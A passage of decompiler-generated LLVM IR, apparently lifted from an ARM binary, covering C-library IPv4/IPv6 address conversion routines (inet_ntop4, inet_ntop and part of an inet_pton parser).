  store i32 %v1_183f0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_184a4.backedge

dec_label_pc_18438:                               ; preds = %dec_label_pc_1841c
  %v1_18438 = inttoptr i32 %v1_183f0 to i8*
  %v2_18438 = load i8, i8* %v1_18438, align 1
  %v3_18438 = zext i8 %v2_18438 to i32
  store i32 %v3_18438, i32* %r3.global-to-local, align 4
  %v2_1843c = icmp eq i8 %v2_18438, 0
  br i1 %v2_1843c, label %dec_label_pc_18540, label %dec_label_pc_18444

dec_label_pc_18444:                               ; preds = %dec_label_pc_18438
  %v0_18444 = load i32, i32* @r6, align 4
  %v1_18444 = add i32 %v0_18444, 2
  store i32 %v1_18444, i32* %r3.global-to-local, align 4
  %v1_18448 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_18444, %v1_18448
  br i1 %tmp37, label %dec_label_pc_18540, label %dec_label_pc_18450

dec_label_pc_18450:                               ; preds = %dec_label_pc_18444
  %v0_18450 = load i32, i32* @r7, align 4
  %v3_18450 = udiv i32 %v0_18450, 256
  store i32 %v3_18450, i32* %r2.global-to-local, align 4
  store i32 %v0_18444, i32* %r3.global-to-local, align 4
  %v1_18458 = trunc i32 %v3_18450 to i8
  %v3_18458 = inttoptr i32 %v0_18444 to i8*
  store i8 %v1_18458, i8* %v3_18458, align 1
  %v4_18458 = load i32, i32* %r3.global-to-local, align 4
  %v5_18458 = add i32 %v4_18458, 1
  store i32 %v5_18458, i32* @r3, align 4
  %v0_1845c = load i32, i32* @r7, align 4
  %v1_1845c = trunc i32 %v0_1845c to i8
  %v2_1845c = load i32, i32* @r6, align 4
  %v3_1845c = add i32 %v2_1845c, 1
  %v4_1845c = inttoptr i32 %v3_1845c to i8*
  store i8 %v1_1845c, i8* %v4_1845c, align 1
  store i32 0, i32* @r7, align 4
  %v0_18464 = load i32, i32* @r3, align 4
  %v1_18464 = add i32 %v0_18464, 1
  store i32 %v1_18464, i32* @r6, align 4
  %v0_18468 = load i32, i32* @r5, align 4
  store i32 %v0_18468, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_184a4.backedge

dec_label_pc_18474:                               ; preds = %dec_label_pc_18414
  %v7_18474 = icmp eq i32 %v0_18414, 46
  br i1 %v7_18474, label %dec_label_pc_1847c, label %dec_label_pc_18540

dec_label_pc_1847c:                               ; preds = %dec_label_pc_18474
  %v0_1847c = load i32, i32* @r6, align 4
  %v1_1847c = add i32 %v0_1847c, 4
  store i32 %v1_1847c, i32* @r4, align 4
  %v1_18480 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1847c, %v1_18480
  br i1 %tmp38, label %dec_label_pc_18540, label %dec_label_pc_18488

dec_label_pc_18488:                               ; preds = %dec_label_pc_1847c
  %v0_18488 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_18488, i32* @r0, align 4
  store i32 %v0_1847c, i32* %r1.global-to-local, align 4
  %v3_18490 = call i32 @inet_pton4(i32 %v0_18488, i32 %v0_1847c)
  %v5_18498 = icmp sgt i32 %v3_18490, 0
  br i1 %v5_18498, label %dec_label_pc_18488.dec_label_pc_184dc_crit_edge, label %dec_label_pc_18540

dec_label_pc_18488.dec_label_pc_184dc_crit_edge:  ; preds = %dec_label_pc_18488
  %v0_18520.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_184dc

dec_label_pc_184a0:                               ; preds = %dec_label_pc_183f8
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_184a4.backedge

dec_label_pc_184a4.backedge:                      ; preds = %dec_label_pc_184a0, %dec_label_pc_1842c, %dec_label_pc_18450
  %v0_184a4 = phi i32 [ %v1_183f0, %dec_label_pc_184a0 ], [ %v1_183f0, %dec_label_pc_1842c ], [ %v0_18468, %dec_label_pc_18450 ]
  %v0_184b012 = phi i32 [ 1, %dec_label_pc_184a0 ], [ 0, %dec_label_pc_1842c ], [ 0, %dec_label_pc_18450 ]
  %v1_184a4 = inttoptr i32 %v0_184a4 to i8*
  %v2_184a4 = load i8, i8* %v1_184a4, align 1
  %v3_184a4 = zext i8 %v2_184a4 to i32
  store i32 %v3_184a4, i32* @r4, align 4
  %v2_184a8 = icmp eq i8 %v2_184a4, 0
  br i1 %v2_184a8, label %dec_label_pc_184b0, label %dec_label_pc_184a4.backedge.dec_label_pc_183e0_crit_edge

dec_label_pc_184a4.backedge.dec_label_pc_183e0_crit_edge: ; preds = %dec_label_pc_184a4.backedge
  %v2_183e0.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_183e0

dec_label_pc_184b0:                               ; preds = %dec_label_pc_184a4.backedge
  %v0_184b4.pre = load i32, i32* @r6, align 4
  %v2_184b0 = icmp eq i32 %v0_184b012, 0
  store i32 %v0_184b4.pre, i32* @r4, align 4
  br i1 %v2_184b0, label %dec_label_pc_184dc, label %dec_label_pc_184bc

dec_label_pc_184bc:                               ; preds = %dec_label_pc_184b0
  %v1_184bc = add i32 %v0_184b4.pre, 2
  store i32 %v1_184bc, i32* %r3.global-to-local, align 4
  %v1_184c0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_184bc, %v1_184c0
  br i1 %tmp39, label %dec_label_pc_18540, label %dec_label_pc_184c8

dec_label_pc_184c8:                               ; preds = %dec_label_pc_184bc
  store i32 %v0_184b4.pre, i32* %r3.global-to-local, align 4
  %v0_184cc = load i32, i32* @r7, align 4
  %v3_184cc = udiv i32 %v0_184cc, 256
  store i32 %v3_184cc, i32* %r2.global-to-local, align 4
  %v1_184d0 = trunc i32 %v3_184cc to i8
  %v3_184d0 = inttoptr i32 %v0_184b4.pre to i8*
  store i8 %v1_184d0, i8* %v3_184d0, align 1
  %v4_184d0 = load i32, i32* %r3.global-to-local, align 4
  %v5_184d0 = add i32 %v4_184d0, 1
  store i32 %v5_184d0, i32* @r3, align 4
  %v0_184d4 = load i32, i32* @r7, align 4
  %v1_184d4 = trunc i32 %v0_184d4 to i8
  %v2_184d4 = load i32, i32* @r6, align 4
  %v3_184d4 = add i32 %v2_184d4, 1
  %v4_184d4 = inttoptr i32 %v3_184d4 to i8*
  store i8 %v1_184d4, i8* %v4_184d4, align 1
  %v0_184d8 = load i32, i32* @r3, align 4
  %v1_184d8 = add i32 %v0_184d8, 1
  store i32 %v1_184d8, i32* @r4, align 4
  br label %dec_label_pc_184dc

dec_label_pc_184dc:                               ; preds = %dec_label_pc_18488.dec_label_pc_184dc_crit_edge, %dec_label_pc_184b0.thread, %dec_label_pc_184b0, %dec_label_pc_184c8
  %v0_18520.pre = phi i32 [ %v0_18520.pre.pre, %dec_label_pc_18488.dec_label_pc_184dc_crit_edge ], [ %v3_1839c, %dec_label_pc_184b0.thread ], [ %v0_184b4.pre, %dec_label_pc_184b0 ], [ %v1_184d8, %dec_label_pc_184c8 ]
  %v0_184dc = load i32, i32* %fp.global-to-local, align 4
  %v2_184dc = icmp eq i32 %v0_184dc, 0
  %v1_18520.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_184dc, label %dec_label_pc_18520, label %dec_label_pc_184e4

dec_label_pc_184e4:                               ; preds = %dec_label_pc_184dc
  %v9_184e4 = icmp eq i32 %v0_18520.pre, %v1_18520.pre
  %v2_184e8 = sub i32 %v0_18520.pre, %v0_184dc
  store i32 %v2_184e8, i32* @ip, align 4
  br i1 %v9_184e4, label %dec_label_pc_18540, label %dec_label_pc_18508.preheader

dec_label_pc_18508.preheader:                     ; preds = %dec_label_pc_184e4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_18508

dec_label_pc_184fc:                               ; preds = %dec_label_pc_18508
  %v2_18510 = sub i32 %v0_1851c, %v0_18514
  %v0_184fc = load i32, i32* %fp.global-to-local, align 4
  %v2_184fc = add i32 %v0_184fc, %v2_1850c
  %v3_184fc = inttoptr i32 %v2_184fc to i8*
  %v4_184fc = load i8, i8* %v3_184fc, align 1
  %v6_184fc = zext i8 %v4_184fc to i32
  store i32 %v6_184fc, i32* @r3, align 4
  %v3_18500 = inttoptr i32 %v2_18510 to i8*
  store i8 %v4_184fc, i8* %v3_18500, align 1
  %v0_18504 = load i32, i32* @lr, align 4
  %v1_18504 = trunc i32 %v0_18504 to i8
  %v2_18504 = load i32, i32* %fp.global-to-local, align 4
  %v3_18504 = load i32, i32* %r1.global-to-local, align 4
  %v4_18504 = add i32 %v3_18504, %v2_18504
  %v5_18504 = inttoptr i32 %v4_18504 to i8*
  store i8 %v1_18504, i8* %v5_18504, align 1
  %v0_18508.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18508.pre = load i32, i32* @ip, align 4
  %v1_18510.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18508

dec_label_pc_18508:                               ; preds = %dec_label_pc_18508.preheader, %dec_label_pc_184fc
  %v0_1851c = phi i32 [ %v1_18520.pre, %dec_label_pc_18508.preheader ], [ %v1_18510.pre, %dec_label_pc_184fc ]
  %v1_1850c = phi i32 [ %v2_184e8, %dec_label_pc_18508.preheader ], [ %v1_18508.pre, %dec_label_pc_184fc ]
  %v0_18514 = phi i32 [ 1, %dec_label_pc_18508.preheader ], [ %v0_18508.pre, %dec_label_pc_184fc ]
  %v2_18508 = sub i32 %v0_18514, %v1_1850c
  %v4_18508 = xor i32 %v0_18514, %v1_1850c
  %v5_18508 = xor i32 %v2_18508, %v0_18514
  %v6_18508 = and i32 %v5_18508, %v4_18508
  %v7_18508 = icmp slt i32 %v6_18508, 0
  %v8_18508 = icmp slt i32 %v2_18508, 0
  %v9_18508 = icmp eq i32 %v0_18514, %v1_1850c
  %v2_1850c = sub i32 %v1_1850c, %v0_18514
  store i32 %v2_1850c, i32* %r1.global-to-local, align 4
  %v1_18514 = add i32 %v0_18514, 1
  store i32 %v1_18514, i32* %r2.global-to-local, align 4
  %v3_18518 = xor i1 %v8_18508, %v7_18508
  %v4_18518 = or i1 %v9_18508, %v3_18518
  br i1 %v4_18518, label %dec_label_pc_184fc, label %dec_label_pc_1851c

dec_label_pc_1851c:                               ; preds = %dec_label_pc_18508
  store i32 %v0_1851c, i32* @r4, align 4
  br label %dec_label_pc_18520

dec_label_pc_18520:                               ; preds = %dec_label_pc_184dc, %dec_label_pc_1851c
  %v0_18520 = phi i32 [ %v0_1851c, %dec_label_pc_1851c ], [ %v0_18520.pre, %dec_label_pc_184dc ]
  %v1_18520 = phi i32 [ %v0_1851c, %dec_label_pc_1851c ], [ %v1_18520.pre, %dec_label_pc_184dc ]
  %v9_18520 = icmp eq i32 %v0_18520, %v1_18520
  br i1 %v9_18520, label %dec_label_pc_18528, label %dec_label_pc_18540

dec_label_pc_18528:                               ; preds = %dec_label_pc_18520
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_18390, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_18534 = call i32 @memcpy()
  br label %dec_label_pc_18558

dec_label_pc_18540:                               ; preds = %dec_label_pc_183f8, %dec_label_pc_18424, %dec_label_pc_18444, %dec_label_pc_18438, %dec_label_pc_184e4, %dec_label_pc_18488, %dec_label_pc_18474, %dec_label_pc_18520, %dec_label_pc_183b4, %dec_label_pc_184bc, %dec_label_pc_1847c
  br label %dec_label_pc_18558

dec_label_pc_18548:                               ; preds = %dec_label_pc_18374
  %v0_18548 = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_18550 = inttoptr i32 %v0_18548 to i32*
  store i32 97, i32* %v2_18550, align 4
  br label %dec_label_pc_18558

dec_label_pc_18558:                               ; preds = %dec_label_pc_18540, %dec_label_pc_18528, %dec_label_pc_18380, %dec_label_pc_18548
  %v1_18560 = phi i32 [ 0, %dec_label_pc_18540 ], [ 1, %dec_label_pc_18528 ], [ %v3_18388, %dec_label_pc_18380 ], [ -1, %dec_label_pc_18548 ]
  store i32 %v3_18354, i32* @r4, align 4
  store i32 %v6_18354, i32* @r5, align 4
  store i32 %v9_18354, i32* @r6, align 4
  store i32 %v12_18354, i32* @r7, align 4
  store i32 %v27_18354, i32* @lr, align 4
  ret i32 %v1_18560

; uselistorder directives
  uselistorder i32 %v2_1850c, { 1, 0 }
  uselistorder i32 %v2_18508, { 1, 0 }
  uselistorder i32 %v0_18514, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_1850c, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1851c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_18520.pre, { 0, 2, 1 }
  uselistorder i32 %v0_18520.pre, { 2, 0, 1 }
  uselistorder i32 %v3_184cc, { 1, 0 }
  uselistorder i32 %v0_184b4.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_184a4, { 1, 0 }
  uselistorder i32 %v0_1847c, { 1, 0, 2 }
  uselistorder i32 %v3_18450, { 1, 0 }
  uselistorder i32 %v0_18444, { 1, 0, 2 }
  uselistorder i32 %v1_183f0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_183e0, { 1, 0 }
  uselistorder i32 %v0_183cc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 2, 4, 5, 6, 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_18558, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_18540, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_18520, { 1, 0 }
  uselistorder label %dec_label_pc_18508, { 1, 0 }
  uselistorder label %dec_label_pc_184dc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_184a4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_183e0, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_18648 = ptrtoint i32* %stack_var_-40 to i32
  %v2_18628 = add i32 %v2_18648, -17
  br label %dec_label_pc_18648

dec_label_pc_18598:                               ; preds = %dec_label_pc_18648
  %v0_18598 = load i32, i32* %fp.global-to-local, align 4
  %v2_18598 = add i32 %v0_18598, %v1_18598
  %v3_18598 = inttoptr i32 %v2_18598 to i8*
  %v4_18598 = load i8, i8* %v3_18598, align 1
  %v6_18598 = zext i8 %v4_18598 to i32
  store i32 %v6_18598, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_18598, 100
  %v2_185a0 = zext i8 %div4 to i32
  store i32 %v2_185a0, i32* %r0.global-to-local, align 4
  %v1_185a4 = or i8 %div4, 48
  %v3_185a8 = add i32 %v2_18658, -17
  %v4_185a8 = inttoptr i32 %v3_185a8 to i8*
  store i8 %v1_185a4, i8* %v4_185a8, align 1
  %v0_185ac = load i32, i32* %r5.global-to-local, align 4
  %v1_185ac = add i32 %v0_185ac, -17
  %v2_185ac = inttoptr i32 %v1_185ac to i8*
  %v3_185ac = load i8, i8* %v2_185ac, align 1
  %v0_185b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_185b0 = add i32 %v0_185b0, 1
  store i32 %v1_185b0, i32* %r6.global-to-local, align 4
  store i32 %v2_18648, i32* %r2.global-to-local, align 4
  %v7_185b8 = icmp eq i8 %v3_185ac, 48
  %v0_185c0 = load i32, i32* %r4.global-to-local, align 4
  %v0_185c8 = load i32, i32* %fp.global-to-local, align 4
  %v1_185c8 = load i32, i32* %sl.global-to-local, align 4
  %v2_185c8 = add i32 %v1_185c8, %v0_185c8
  store i32 %v2_185c8, i32* %sb.global-to-local, align 4
  %v2_185d0 = udiv i32 %v0_185c0, 10
  %v1_185d8 = urem i32 %v2_185d0, 256
  %v2_185dc = udiv i32 %v1_185d8, 10
  %v3_185dc = urem i32 %v1_185d8, 10
  store i32 %v2_185dc, i32* %r0.global-to-local, align 4
  %v1_185e0 = or i32 %v3_185dc, 48
  br i1 %v7_185b8, label %dec_label_pc_185d0, label %dec_label_pc_185f8

dec_label_pc_185d0:                               ; preds = %dec_label_pc_18598
  %v7_185e8 = icmp eq i32 %v1_185e0, 48
  br i1 %v7_185e8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_185d0
  store i32 %v1_185b0, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_185d0, %bb
  %v1_185f0 = trunc i32 %v1_185e0 to i8
  store i8 %v1_185f0, i8* %v2_185ac, align 1
  %v0_18624.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18614

dec_label_pc_185f8:                               ; preds = %dec_label_pc_18598
  %v2_185c4 = add i32 %v1_185b0, %v2_18648
  %v1_1860c = trunc i32 %v1_185e0 to i8
  %v3_1860c = add i32 %v2_185c4, -17
  %v4_1860c = inttoptr i32 %v3_1860c to i8*
  store i8 %v1_1860c, i8* %v4_1860c, align 1
  %v0_18610 = load i32, i32* %r6.global-to-local, align 4
  %v1_18610 = add i32 %v0_18610, 1
  store i32 %v1_18610, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18614

dec_label_pc_18614:                               ; preds = %bb18, %dec_label_pc_185f8
  %v0_18624 = phi i32 [ %v0_18624.pre, %bb18 ], [ %v1_18610, %dec_label_pc_185f8 ]
  %v0_18614 = load i32, i32* %sb.global-to-local, align 4
  %v1_18614 = inttoptr i32 %v0_18614 to i8*
  %v2_18614 = load i8, i8* %v1_18614, align 1
  %tmp19 = urem i8 %v2_18614, 10
  store i32 %v2_18648, i32* %ip.global-to-local, align 4
  %v1_18624 = add i32 %v0_18624, 1
  store i32 %v1_18624, i32* %r0.global-to-local, align 4
  %v1_1862c = or i8 %tmp19, 48
  %v3_18630 = add i32 %v2_18628, %v0_18624
  %v4_18630 = inttoptr i32 %v3_18630 to i8*
  store i8 %v1_1862c, i8* %v4_18630, align 1
  %v0_18634 = load i32, i32* %ip.global-to-local, align 4
  %v1_18634 = load i32, i32* %r0.global-to-local, align 4
  %v2_18634 = add i32 %v1_18634, %v0_18634
  store i32 %v2_18634, i32* %r2.global-to-local, align 4
  %v3_1863c = add i32 %v2_18634, -17
  %v4_1863c = inttoptr i32 %v3_1863c to i8*
  store i8 46, i8* %v4_1863c, align 1
  %v0_18640 = load i32, i32* %r0.global-to-local, align 4
  %v1_18640 = add i32 %v0_18640, 1
  store i32 %v1_18640, i32* %r6.global-to-local, align 4
  %v0_18644 = load i32, i32* %sl.global-to-local, align 4
  %v1_18644 = add i32 %v0_18644, 1
  store i32 %v1_18644, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18648

dec_label_pc_18648:                               ; preds = %entry, %dec_label_pc_18614
  %v0_18654 = phi i32 [ 0, %entry ], [ %v1_18640, %dec_label_pc_18614 ]
  %v1_18598 = phi i32 [ 0, %entry ], [ %v1_18644, %dec_label_pc_18614 ]
  store i32 %v2_18648, i32* %ip.global-to-local, align 4
  store i32 %v0_18654, i32* %r7.global-to-local, align 4
  %v2_18658 = add i32 %v0_18654, %v2_18648
  store i32 %v2_18658, i32* %r5.global-to-local, align 4
  %v7_1865c = icmp sgt i32 %v1_18598, 3
  br i1 %v7_1865c, label %dec_label_pc_18660, label %dec_label_pc_18598

dec_label_pc_18660:                               ; preds = %dec_label_pc_18648
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_18664 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_18664, i32* %r4.global-to-local, align 4
  %v3_18668 = add i32 %v2_18658, -18
  %v4_18668 = inttoptr i32 %v3_18668 to i8*
  store i8 0, i8* %v4_18668, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_18664, i32* %r0.global-to-local, align 4
  %v3_18670 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_18670, i32* %r0.global-to-local, align 4
  %v2_18674 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_18674, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_18670, %v2_18674
  br i1 %tmp, label %dec_label_pc_18680, label %dec_label_pc_18694

dec_label_pc_18680:                               ; preds = %dec_label_pc_18660
  %v0_18680 = call i32 @__GI___errno_location()
  store i32 %v0_18680, i32* %r0.global-to-local, align 4
  %v0_18688 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18688, i32* %r2.global-to-local, align 4
  %v2_1868c = inttoptr i32 %v0_18680 to i32*
  store i32 28, i32* %v2_1868c, align 4
  %v0_186a4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_186a4

dec_label_pc_18694:                               ; preds = %dec_label_pc_18660
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_18664, i32* @r1, align 4
  %v2_1869c = inttoptr i32 %arg2 to i8*
  %v3_1869c = call i32 @strcpy(i8* %v2_1869c, i32 %v2_18664)
  store i32 %v3_1869c, i32* %r0.global-to-local, align 4
  store i32 %v3_1869c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_186a4

dec_label_pc_186a4:                               ; preds = %dec_label_pc_18680, %dec_label_pc_18694
  %v0_186a4 = phi i32 [ %v0_186a4.pre, %dec_label_pc_18680 ], [ %v3_1869c, %dec_label_pc_18694 ]
  store i32 %v0_186a4, i32* %r0.global-to-local, align 4
  ret i32 %v0_186a4

; uselistorder directives
  uselistorder i32 %v0_186a4, { 1, 0 }
  uselistorder i32 %v2_18664, { 1, 0, 2, 3 }
  uselistorder i32 %v2_18658, { 0, 2, 1 }
  uselistorder i32 %v1_18598, { 1, 0 }
  uselistorder i32 %v1_185e0, { 1, 0, 2 }
  uselistorder i32 %v2_18648, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i8 48, { 0, 6, 1, 4, 7, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_186a4, { 1, 0 }
  uselistorder label %dec_label_pc_18648, { 1, 0 }
  uselistorder label %dec_label_pc_18614, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_186b4 = load i32, i32* @r5, align 4
  %v7_186c0 = icmp eq i32 %arg1, 2
  store i1 %v7_186c0, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_186c0, label %dec_label_pc_186e4, label %dec_label_pc_186d8

dec_label_pc_186d8:                               ; preds = %entry
  %v7_186d8 = icmp eq i32 %arg1, 10
  store i1 %v7_186d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_186d8, label %dec_label_pc_186f8, label %dec_label_pc_1890c

dec_label_pc_186e4:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_186f0 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_18904

dec_label_pc_186f8:                               ; preds = %dec_label_pc_186d8
  %v2_186f8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_186f8, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_18704 = bitcast i32* %stack_var_-72 to i8*
  %v3_18704 = call i32 @__GI_memset(i8* %v2_18704, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_18728 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1870c

dec_label_pc_1870c:                               ; preds = %dec_label_pc_1870c.dec_label_pc_1870c_crit_edge, %dec_label_pc_186f8
  %v0_18724 = phi i32 [ %v0_1870c.pre, %dec_label_pc_1870c.dec_label_pc_1870c_crit_edge ], [ 0, %dec_label_pc_186f8 ]
  %v1_1870c = load i32, i32* @r8, align 4
  %v2_1870c = add i32 %v1_1870c, %v0_18724
  %v3_18710 = inttoptr i32 %v2_1870c to i8*
  %v4_18710 = load i8, i8* %v3_18710, align 1
  %v6_18710 = zext i8 %v4_18710 to i32
  %v1_18714 = add i32 %v2_1870c, 1
  %v2_18714 = inttoptr i32 %v1_18714 to i8*
  %v3_18714 = load i8, i8* %v2_18714, align 1
  %v4_18714 = zext i8 %v3_18714 to i32
  %tmp74 = icmp slt i32 %v0_18724, 0
  %v4_18718 = zext i1 %tmp74 to i32
  %v5_18718 = add i32 %v4_18718, %v0_18724
  %v4_1871c = mul nuw nsw i32 %v6_18710, 256
  %v5_1871c = or i32 %v4_18714, %v4_1871c
  store i32 %v5_1871c, i32* %r2.global-to-local, align 4
  %v3_18720 = sdiv i32 %v5_18718, 2
  %v1_18724 = add i32 %v0_18724, 2
  store i32 %v1_18724, i32* %r0.global-to-local, align 4
  %v4_1872c = mul i32 %v3_18720, 4
  %v5_1872c = add i32 %v4_1872c, %v2_18728
  %v7_18730 = icmp eq i32 %v1_18724, 15
  store i1 %v7_18730, i1* %cpsr_z.global-to-local, align 1
  %v2_18734 = add i32 %v5_1872c, -32
  %v3_18734 = inttoptr i32 %v2_18734 to i32*
  store i32 %v5_1871c, i32* %v3_18734, align 4
  %v7_18738 = icmp sgt i32 %v1_18724, 15
  br i1 %v7_18738, label %dec_label_pc_1873c, label %dec_label_pc_1870c.dec_label_pc_1870c_crit_edge

dec_label_pc_1870c.dec_label_pc_1870c_crit_edge:  ; preds = %dec_label_pc_1870c
  %v0_1870c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1870c

dec_label_pc_1873c:                               ; preds = %dec_label_pc_1870c
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18754

dec_label_pc_18754:                               ; preds = %dec_label_pc_1873c, %dec_label_pc_187a0
  %v0_18794 = phi i32 [ -1, %dec_label_pc_1873c ], [ %v0_187c8, %dec_label_pc_187a0 ]
  %v0_18784 = phi i32 [ -1, %dec_label_pc_1873c ], [ %v0_187b4, %dec_label_pc_187a0 ]
  %v0_18768 = phi i32 [ -1, %dec_label_pc_1873c ], [ %v0_187687, %dec_label_pc_187a0 ]
  %v0_187a0 = phi i32 [ 0, %dec_label_pc_1873c ], [ %v1_187a0, %dec_label_pc_187a0 ]
  %v4_18758 = mul nuw nsw i32 %v0_187a0, 4
  %v5_18758 = add i32 %v4_18758, %v2_18728
  %v1_1875c = add i32 %v5_18758, -32
  %v2_1875c = inttoptr i32 %v1_1875c to i32*
  %v3_1875c = load i32, i32* %v2_1875c, align 4
  %v2_18760 = icmp eq i32 %v3_1875c, 0
  %v7_18768 = icmp eq i32 %v0_18768, -1
  br i1 %v2_18760, label %dec_label_pc_18768, label %dec_label_pc_1877c

dec_label_pc_18768:                               ; preds = %dec_label_pc_18754
  br i1 %v7_18768, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18768
  store i32 %v0_187a0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_187a0

.thread:                                          ; preds = %dec_label_pc_18768
  %v1_18774.pre = load i32, i32* @r4, align 4
  %v2_18774 = add i32 %v1_18774.pre, 1
  store i32 %v2_18774, i32* @r4, align 4
  br label %dec_label_pc_187a0

